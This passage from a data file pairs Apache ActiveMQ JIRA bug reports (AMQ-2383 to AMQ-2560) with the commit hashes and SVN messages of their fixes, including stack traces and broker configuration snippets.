12483215,AMQ-2560,"It is possible to loose an ack after failover if an outstanding consumer transaction (and ack) is in progress during failover. If due to ordering or timing, an unexpected message is replayed to the consumer on recovery it will delivered (and correctly not suppressed as a duplicate). This will be acked with the outstanding messages but the ack will result in an exception {code}javax.jms.JMSException: Unmatched acknowledege: MessageAck...{code} as the original message will not have been re-dispatched. Essentially the ack is lost at this stage.
The message will stay dispatched/inflight til the consumer closes, at which point it can again be re-dispatched to another consumer. A broker restart will also see it re-dispatched. In the mean time, it can look orphaned for some time or will be visible in the jdbc store. It will also be visible via the inflight count on that consumer.

Resolution:
On a transport disconnect, a consumer should discard acked state along with delivered messages as the messages that are redelivered are not guaranteed to be the same. This was not being done for a transacted session. Replayed messages are more likely to be the same if the order of connection recovery is preserved, but this will not be sufficient. (the test case shows the problem because recovery order is dependent on hashmap order which is random when dealing with connection ids)
This needs to be done for both consumers that use receive() or message listeners (that are handled through dispatch)",9cf216cce13299c81ddc805306b0ffaf3b096214,"resolve intermittent ZeroPrefetchConsumerTest failure - prefetch excension decrement needs to be conditional on prefecth=0, relates to changes to prefetchExtension for https://issues.apache.org/activemq/browse/AMQ-2560

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@898281 13f79535-47bb-0310-9956-ffa450edef68"
12483514,AMQ-2556,"Some transaction related information are not released in case of read-only transactions (where not messages have been consumed or produced) by broker and client, that causes an OutOfMemory after running some time.

Fields that hold these ""transaction related information"" are (at least) :
- {{org.apache.activemq.state.ConnectionState.transactions}}
- {{org.apache.activemq.TransactionContext.ENDED_XA_TRANSACTION_CONTEXTS}}

After serach, it seems that the case of read-only XA transactions (that terminates at prepare time) has been missed in some code like :
- {{org.apache.activemq.broker.TransportConnection}} that puts TransactionState in {{org.apache.activemq.state.ConnectionState.transactions}} at the beginning, release them at commit (or rollback) time *but not at prepare time where result is {{XAResource.XA_RDONLY}}*
- {{org.apache.activemq.TransactionContext}} that do the same mistake via ENDED_XA_TRANSACTION_CONTEXTS in prepare()

_Note that the case of read-only transactions seems correctly done by {{org.apache.activemq.transaction.XATransaction}} (very interesting comment here http://fisheye6.atlassian.com/browse/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/transaction/XATransaction.java?r=809940#l175)_
",eedda6f2d1a3fa3e06793ca9e0d3a0891415f75a,"follow up on comment to https://issues.apache.org/activemq/browse/AMQ-2556 - ensure ended tx are removed in the event that prepare results in an exception

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@995397 13f79535-47bb-0310-9956-ffa450edef68"
12482904,AMQ-2550,"The bundle org.apache.activemq.activemq-core - version 5.4-SNAPSHOT cannot be installed on Apache Felix Karaf 1.2 due to unresolve constraint :

(&(package=org.osgi.framework)(version>=1.4.0)(!(version>=1.5.0)))

Felix 2.0.1 exports this package version : 

karaf@root> packages:exports  0
System Bundle (0): org.osgi.framework; version=1.5.0

BE CAREFUL ABOUT PROJECT SYNCHRONIZATION WITH KARAF, SMX4 and CAMEL for OSGI STUFFS",57843ea8a9b11e3f8fc8e672a897f3200131e2f7,"AMQ-2550 Fixed the issue of org.osgi.framework import

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@893834 13f79535-47bb-0310-9956-ffa450edef68"
12483172,AMQ-2547,Make ActiveMQ work correctly with Spring 3.0,1035ac3417d7245f4e9c321714315478aa08e158,"add spring-jms dependency to resolve cnf post https://issues.apache.org/activemq/browse/AMQ-2547 - upgrading trunk to spring 3.0.1.RELEASE

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@917645 13f79535-47bb-0310-9956-ffa450edef68"
12483167,AMQ-2539,Session.createTemporaryTopic() for example will successfully create a temporary topic even though it is not allowed by security policies.,3a1bdc624957273ddfde90cdefbfd681afa27c5c,"https://issues.apache.org/activemq/browse/AMQ-2539 - adding temp destinations and security

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@891786 13f79535-47bb-0310-9956-ffa450edef68"
12483081,AMQ-2529,"When you browse a queue over the network, messages are not removed from the local broker, so they can be later consumer from both local and remote broker",10dae9c659d363d820c29c5bd5378cc9fa043a25,"https://issues.apache.org/activemq/browse/AMQ-2529 - browse over network

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@889677 13f79535-47bb-0310-9956-ffa450edef68"
12483585,AMQ-2528,"According to the JMS specification, an ""empty string"" message selector indicates no message selector (i.e., all messages should be selected):

""A message selector is a String whose syntax is based on a subset of the SQL92 conditional expression syntax. If the value of a message selector is an empty string, the value is treated as a null and indicates that there is no message selector for the message consumer.""

However, if org.apache.activemq.broker.region.Queue#removeMatchingMessages(String selector)  with selector = """", the following stacktrace is generated:

javax.jms.InvalidSelectorException: 
	at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:72)
	at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:46)
	at org.apache.activemq.broker.region.Queue.createSelectorFilter(Queue.java:1200)
	at org.apache.activemq.broker.region.Queue.removeMatchingMessages(Queue.java:908)
	at org.apache.activemq.broker.region.Queue.removeMatchingMessages(Queue.java:898)
	at com.invoqsystems.foundation.utility.AMQUtility.deleteMessages(AMQUtility.java:192)
	at com.invoqsystems.foundation.utility.AMQUtilityTest.testDeleteMessages(AMQUtilityTest.java:187)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.junit.internal.runners.TestMethodRunner.executeMethodBody(TestMethodRunner.java:99)
	at org.junit.internal.runners.TestMethodRunner.runUnprotected(TestMethodRunner.java:81)
	at org.junit.internal.runners.BeforeAndAfterRunner.runProtected(BeforeAndAfterRunner.java:34)
	at org.junit.internal.runners.TestMethodRunner.runMethod(TestMethodRunner.java:75)
	at org.junit.internal.runners.TestMethodRunner.run(TestMethodRunner.java:45)
	at org.junit.internal.runners.TestClassMethodsRunner.invokeTestMethod(TestClassMethodsRunner.java:71)
	at org.junit.internal.runners.TestClassMethodsRunner.run(TestClassMethodsRunner.java:35)
	at org.junit.internal.runners.TestClassRunner$1.runUnprotected(TestClassRunner.java:42)
	at org.junit.internal.runners.BeforeAndAfterRunner.runProtected(BeforeAndAfterRunner.java:34)
	at org.junit.internal.runners.TestClassRunner.run(TestClassRunner.java:52)
	at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:38)
	at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:38)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:460)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:673)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:386)
	at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:196)
Caused by: org.apache.activemq.selector.ParseException: Parse error at line 0, column 0.  Encountered: <EOF>
	at org.apache.activemq.selector.SelectorParser.generateParseException(SelectorParser.java:1196)
	at org.apache.activemq.selector.SelectorParser.jj_consume_token(SelectorParser.java:1148)
	at org.apache.activemq.selector.SelectorParser.unaryExpr(SelectorParser.java:453)
	at org.apache.activemq.selector.SelectorParser.multExpr(SelectorParser.java:375)
	at org.apache.activemq.selector.SelectorParser.addExpression(SelectorParser.java:344)
	at org.apache.activemq.selector.SelectorParser.comparisonExpression(SelectorParser.java:196)
	at org.apache.activemq.selector.SelectorParser.equalityExpression(SelectorParser.java:141)
	at org.apache.activemq.selector.SelectorParser.andExpression(SelectorParser.java:120)
	at org.apache.activemq.selector.SelectorParser.orExpression(SelectorParser.java:99)
	at org.apache.activemq.selector.SelectorParser.JmsSelector(SelectorParser.java:91)
	at org.apache.activemq.selector.SelectorParser.parse(SelectorParser.java:69)
	... 26 more


",d5b604ec58973e18ce48f6a1e7ab3ac17b7424eb,"Fix and test for: https://issues.apache.org/jira/browse/AMQ-2528

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1144736 13f79535-47bb-0310-9956-ffa450edef68"
12482965,AMQ-2516,"I have enabled authentication + authorization in my broker configuration file as follows:

<jaasAuthenticationPlugin configuration=""PropertiesLogin"" />

<authorizationPlugin>
<map>
<authorizationMap>
<authorizationEntries>
<authorizationEntry queue="">"" read=""users"" write=""users"" admin=""users""/>
<authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""users"" write=""users"" admin=""users""/>
</authorizationEntries>
</authorizationMap>
</map>
</authorizationPlugin>

If I send a message with a TTL into the queue (using provided sample configured with the right username and password) and then try to look after the message in the queue after it has expired using the Web Console, I got the following exception:

""Caught an exception sending to DLQ: Message ID:PC198829-1539-1259168148838-0:1:1:1:1 dropped=false locked=false
java.lang.SecurityException: User is not authenticated.""

This only occurs when the broker has to deal with the DLQ as I can successfully read/write in any queue.

It seems that the thread responsible for moving the message into the DLQ doesn't have the right to perform this action (username and password not propagated to its connexion context ? ).
",adb7fccda0ff16e0c8f5c935ac6cec2fefb0c0c8,"resolve https://issues.apache.org/activemq/browse/AMQ-2516 - broker send to dlq now uses broker security context so it will bypass the authentication plugin when configured

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@884778 13f79535-47bb-0310-9956-ffa450edef68"
12483801,AMQ-2513,"How to reproduce:

1) start broker
2) start sending/receiving messages to/from a queue
3) the queue will show up in MBeans tree
4) kill the broker (e.g. end process on windows)
5) stat broker again
6) you can find your queue in Broker->Queues attribute, but not as a separate node on MBeans tree (see screenshot)
7) (optional) start sending/receiving messages to/from a queue
8) open web console. following exception will be thrown:

2009-11-25 21:47:45,525 | ERROR | /admin/queues.jsp;jsessionid=yjy1i2uuahpk | org.mortbay.log | btpool0-1
javax.el.ELException: java.lang.reflect.UndeclaredThrowableException
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:266)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:143)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:984)
	at org.apache.jsp.queues_jsp._jspx_meth_c_forEach_0(org.apache.jsp.queues_jsp:141)
	at org.apache.jsp.queues_jsp._jspService(org.apache.jsp.queues_jsp:101)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:93)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:373)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:470)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:364)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:43)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360)
	at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)
	at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)
	at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114)
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
	at org.mortbay.jetty.Server.handle(Server.java:324)
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505)
	at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:828)
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514)
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211)
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380)
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395)
	at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450)
Caused by: java.lang.reflect.UndeclaredThrowableException
	at $Proxy4.getName(Unknown Source)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:261)
	... 39 more
Caused by: javax.management.InstanceNotFoundException: org.apache.activemq:BrokerName=localhost,Type=Queue,Destination=dee.q
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getMBean(DefaultMBeanServerInterceptor.java:1094)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:662)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638)
	at javax.management.MBeanServerInvocationHandler.invoke(MBeanServerInvocationHandler.java:263)
	... 45 more


I'm using latest 5.3.1-SNAPSHOT",df52a090639bb0830f27824e1fc3130d6d9f13a2,"https://issues.apache.org/activemq/browse/AMQ-2513 - adding test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@888333 13f79535-47bb-0310-9956-ffa450edef68"
12483801,AMQ-2513,"How to reproduce:

1) start broker
2) start sending/receiving messages to/from a queue
3) the queue will show up in MBeans tree
4) kill the broker (e.g. end process on windows)
5) stat broker again
6) you can find your queue in Broker->Queues attribute, but not as a separate node on MBeans tree (see screenshot)
7) (optional) start sending/receiving messages to/from a queue
8) open web console. following exception will be thrown:

2009-11-25 21:47:45,525 | ERROR | /admin/queues.jsp;jsessionid=yjy1i2uuahpk | org.mortbay.log | btpool0-1
javax.el.ELException: java.lang.reflect.UndeclaredThrowableException
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:266)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:143)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:984)
	at org.apache.jsp.queues_jsp._jspx_meth_c_forEach_0(org.apache.jsp.queues_jsp:141)
	at org.apache.jsp.queues_jsp._jspService(org.apache.jsp.queues_jsp:101)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:93)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:373)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:470)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:364)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:43)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360)
	at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)
	at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)
	at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114)
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
	at org.mortbay.jetty.Server.handle(Server.java:324)
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505)
	at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:828)
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514)
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211)
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380)
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395)
	at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450)
Caused by: java.lang.reflect.UndeclaredThrowableException
	at $Proxy4.getName(Unknown Source)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:261)
	... 39 more
Caused by: javax.management.InstanceNotFoundException: org.apache.activemq:BrokerName=localhost,Type=Queue,Destination=dee.q
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getMBean(DefaultMBeanServerInterceptor.java:1094)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:662)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:638)
	at javax.management.MBeanServerInvocationHandler.invoke(MBeanServerInvocationHandler.java:263)
	... 45 more


I'm using latest 5.3.1-SNAPSHOT",6e1ba4a93edb4b3b9157156e1ef929eb80dd284d,"https://issues.apache.org/activemq/browse/AMQ-2513 - adapting DiscoveryNetworkReconnectTest

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@888426 13f79535-47bb-0310-9956-ffa450edef68"
12483100,AMQ-2502,"If pooling is used, org.apache.activemq.pool.PooledConnectionFactory is instantiated using reflection. BND does not detect this, so compliant OSGI containers will throw a class not found exception. To fix, the following line should be added to the <activemq.osgi.import.pkg /> section of the pom:

org.apache.activemq.pool;resolution:=optional,",86e7d511a8e64e80abe28a66595ca9487668008e,"resolve https://issues.apache.org/activemq/browse/AMQ-2502, add optional import of pool

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@882136 13f79535-47bb-0310-9956-ffa450edef68"
12483743,AMQ-2488,"I have configured applications to use Log4J's JMSAppender in order to log messages on a queue as follows;

{noformat}
log4j.appender.jms=org.apache.log4j.net.JMSAppender
log4j.appender.jms.InitialContextFactoryName=org.apache.activemq.jndi.ActiveMQInitialContextFactory
log4j.appender.jms.ProviderURL=tcp://localhost:61616
log4j.appender.jms.TopicBindingName=logTopic
log4j.appender.jms.TopicConnectionFactoryBindingName=ConnectionFactory
{noformat}

Each application logging statement adds a new message to topic://logTopic on the broker.  I have a bundle deployed that attempts to route the messages from this topic with camel;

{code}
from(""activemq:topic:logTopic"")
  .convertBodyTo(String.class)
  .to(""log:foo?level=DEBUG&showProperties=true&showHeaders=true"");
{code}

When using servicemix 4 (Fuse 4.1.0.4), a stack trace is seen with the following message (enhanced using felix.log.level=4);


{noformat}Caused by: java.lang.ClassNotFoundException: *** Class 'org.apache.log4j.spi.LoggingEvent' 
was not found because bundle 56 does not import 'org.apache.log4j.spi' even though bundle 84 
does export it. To resolve this issue, add an import for 'org.apache.log4j.spi' to bundle 56. ***
{noformat}

Bundles as follows;

{noformat}smx@root:/> osgi/list|grep 56
[  56] [Active     ] [       ] [   60] activemq-core (5.3.0.fuse)

smx@root:/> osgi/list|grep 84
[  84] [Active     ] [       ] [    8] OPS4J Pax Logging - API (1.3.0)
{noformat}
",3ea1015a929ca4715ca0d79b074d727b94d1a062,"https://issues.apache.org/activemq/browse/AMQ-2488 - dynamic osgi import for activemq-core

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@898812 13f79535-47bb-0310-9956-ffa450edef68"
12482540,AMQ-2466,The addition of josql for the new admin commands in AMQ-2462 requires an import in admin-console.,c3881bf4f7e043f42175552d8eb0de3e699fd4d2,"https://issues.apache.org/activemq/browse/AMQ-2466 - josql osgi

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@830122 13f79535-47bb-0310-9956-ffa450edef68"
12483876,AMQ-2453,"The start-scripts ""activemq"" and ""activemq-admin"" do not seem to be ready for production use.

Reasons:
- Server does not run in background
  => this can be done by redirecting output to a file and run in background
  => in my opinion this should be implemented directly in java
  => the console log should be written by log4j to <install-root>/data/console.log
- The process should be started on a non-root user 
  => use 'su -c ""$COMMAND"" - $RUN_AS_USER' 
  => this should be defined in /etc/activemq.conf
- The script should support a ""reload"" feature to reload the configurartion
  (if activemq supports reloading)
- The script should support a ""status"" option
  => this should show a quick overview about the state of activemq
  => this should return a value != 0 if the service is not working
     (this is important for cluster integration)

Does anybody already working on these items?
Do you have suggestions for a implementation?
",e0776ff0208d8570351202ab15baada0eba014b2,"Fix for: https://issues.apache.org/jira/browse/AMQ-2453

Add an LSB header to the init scripts 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1368455 13f79535-47bb-0310-9956-ffa450edef68"
12483296,AMQ-2448,"I've discovered a reproducible memory leak.  After discussion on IRC, it is believed to be related to my network of brokers configuration.
I have a total of 4 brokers configured on 4 hosts (activemq1,2,3,4).
activemq1 and activemq2 are a shared filesystem master slave pair.  activemq3 and activemq4 are setup in a similar way as a master/slave pair.
Only one of activemq1 and 2 will be active at a time, likewise only one of activemq3 and 4.

Both activemq1 and activemq2 have a config with the following networkConnector.
<networkConnectors>
                <networkConnector
                        uri=""static://(tcp://activemq3:61616,tcp://activemq4:61616)""
                        name=""Connection to 3 and 4""
                        networkTTL=""5""
                        dynamicOnly=""true""/>
</networkConnectors>

The broker will only be able to connect to either 3 or 4 as only one can be running at a time.
For obvious reasons, connecting to the slave will fail, but the connection attempt will be retried every 30 seconds by default (more often on initial startup due to backoff algorithm).
It is believed that the continuous reconnect attempts are the source of the memory leak.",ce8f83acf1112aa6f6773aa1010aa6ea569faf06,"https://issues.apache.org/activemq/browse/AMQ-2448 - adding test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@931216 13f79535-47bb-0310-9956-ffa450edef68"
12482976,AMQ-2447,"the error comes from even though we already define specific helpFile field in BstatCommand, but this field can't be overriden in the method printHelp() in QueryCommand

add   printHelp() method for BstatCommand can fix it",a015154bd8dac7ee9de527ed9a00b3eb2ff756a8,"Apply patch for https://issues.apache.org/activemq/browse/AMQ-2447

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@825009 13f79535-47bb-0310-9956-ffa450edef68"
12482130,AMQ-2440,"The bug is observed on code checkout from https://svn.apache.org/repos/asf/activemq/tags/activemq-5.3.0
A server is initiated with stomp+nio transport on port 61612.

A client connects. A SelectorWorker is created on SelectorManager:68.
If the client drops the connection an exception is received at StompNIOTransport:91.
""java.io.IOException: An existing connection was forcibly closed by the remote host"".
But selector are not cleaned up. It works with stomp transport. But not with stomp+nio.

What I see in the end is an increasing number of ""connections"" if the JVM.
",8141baacefe292ce9b3eebd1184a04bd0c5d085b,"https://issues.apache.org/activemq/browse/AMQ-2440 - adding initial activemq-stomp.xml configuration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@897262 13f79535-47bb-0310-9956-ffa450edef68"
12482130,AMQ-2440,"The bug is observed on code checkout from https://svn.apache.org/repos/asf/activemq/tags/activemq-5.3.0
A server is initiated with stomp+nio transport on port 61612.

A client connects. A SelectorWorker is created on SelectorManager:68.
If the client drops the connection an exception is received at StompNIOTransport:91.
""java.io.IOException: An existing connection was forcibly closed by the remote host"".
But selector are not cleaned up. It works with stomp transport. But not with stomp+nio.

What I see in the end is an increasing number of ""connections"" if the JVM.
",1f6f0c510777db3baf4fbc000b51dec3926fd46a,"https://issues.apache.org/activemq/browse/AMQ-2440 - add commons-management dependency needed for camel 2.2.0 web app

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@921291 13f79535-47bb-0310-9956-ffa450edef68"
12483096,AMQ-2439,"Every time the broker is restarted, the same set of duplicate messages get redelivered to consumers.",1d5bcaf2743d66bc6a99384239d95bb35c7334e6,"AMQ-2439: Unit test for the kahadb message store


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@821103 13f79535-47bb-0310-9956-ffa450edef68"
12483007,AMQ-2413,"I don't understand the intent of the following code in Queue.doPageIn() and in rev 818147 it was causing delivery to the consumer to get hung (temporarily until message expiration check kickstarts it again). See the commented out lines of code that determine how many messages to attempt to page in. 

{code}
    private List<QueueMessageReference> doPageIn(boolean force) throws Exception {
        List<QueueMessageReference> result = null;
        List<QueueMessageReference> resultList = null;
        synchronized(dispatchMutex) {
            //WHAT IS THIS DOING?
            //int toPageIn = getMaxPageSize() + Math.max(0, (int)destinationStatistics.getInflight().getCount()) -pagedInMessages.size();

            //DOES THIS MAKE MORE SENSE:
            int toPageIn = Math.min(getMaxPageSize(), messages.size());
            
            if (LOG.isDebugEnabled()) {
                LOG.debug(destination.getPhysicalName() + "" toPageIn: ""  + toPageIn + "", Inflight: ""
                        + destinationStatistics.getInflight().getCount()
                        + "", pagedInMessages.size "" + pagedInMessages.size());
            }
            
            //WHAT IS THIS DOING?
            //toPageIn = Math.max(0, Math.min(toPageIn, getMaxPageSize()));
                       
            if (isLazyDispatch()&& !force) {
                // Only page in the minimum number of messages which can be dispatched immediately.
                toPageIn = Math.min(getConsumerMessageCountBeforeFull(), toPageIn);
            }
   
{code}

It is definitely possible that I'm just not understanding the intent of the code, but whatever it is, it's not working, and consequently I'm not sure that the subsequent fixes on the branch have eliminated the problem. The attached patch contains both a unit test, that tests several combinations of ack mode, vm cursoring, and delivery mode, as well as version of Queue which should be applied against revirion 818147 -- this version has the fix commented out and preserves the buggy behavior",74148299dc95dc97600d58a997e121b859ce7fc6,"https://issues.apache.org/activemq/browse/AMQ-2413 - prevent test failures on slow machines

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@819493 13f79535-47bb-0310-9956-ffa450edef68"
12482929,AMQ-2401,"While running performance tests I I was seeing hangs in several tests  involving dups ok queue receivers. My suspicion is that this is related to ""too lazy"" dups_ok acknowledgements. Changing the queue prefetchLimit to 100 caused this problem to go away. This needs more investigation, but it seems like we can get ourselves in to trouble if the queue size is smaller than the receiver's prefetchLimit, and this should be avoid. It is also possible that there is something more complicated happening in my tests. I haven't yet been able to reproduce this outside my performance test environment. 
",7f534db142bad99aa8564906e3a6703027a40f35,"Adding a modified version of the test case attached to AMQ2401.  This test would fail quickly before the patch in revision 818487 was applied.



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@818496 13f79535-47bb-0310-9956-ffa450edef68"
12483041,AMQ-2393,<NA>,da6809ced39e304728aebeec3561fed644ec7568,"https://issues.apache.org/activemq/browse/AMQ-2393 - add repositories for jsr311-api

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@815661 13f79535-47bb-0310-9956-ffa450edef68"
12482807,AMQ-2384,"On running a Tenable nessus scan against the machine where ActiveMQ is running, we see that the port 61616 , the TCP connector port accepts Low and Medium strength ciphers by default. This may be a security risk and therefore we need a way to specify which ciphers to support.",9822d58d04abe22f059b85b418478a4f80592322,"resolve https://issues.apache.org/activemq/browse/AMQ-2384 - not exactly the patch but allowing the introspector to work, which is more generic with some tests, thanks phil for the impetus on this

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@929618 13f79535-47bb-0310-9956-ffa450edef68"
12482485,AMQ-2383,"When I run the attached test case I notice the following exception in the logs. 

javax.jms.JMSException: Transaction 'TX:ID:gr-gr-60307-1252609475470-2:1:1' has not been started.
	at org.apache.activemq.broker.TransactionBroker.getTransaction(TransactionBroker.java:270)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:190)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456)
